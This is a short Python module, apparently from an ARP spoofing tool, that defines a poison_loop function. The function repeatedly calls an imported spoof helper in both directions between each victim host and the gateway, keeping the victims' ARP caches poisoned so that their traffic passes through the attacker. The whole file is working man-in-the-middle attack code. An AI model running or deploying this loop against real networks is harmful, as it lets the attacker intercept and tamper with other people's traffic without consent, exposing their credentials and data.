import time
from .arp_utils import spoof

def poison_loop(victim_macs, gateway_ip, mac_gateway, iface, sleep_time):
    while True:
        for ip, mac in victim_macs.items():
            spoof(ip, mac, gateway_ip, iface)
            spoof(gateway_ip, mac_gateway, ip, iface)
        time.sleep(sleep_time)
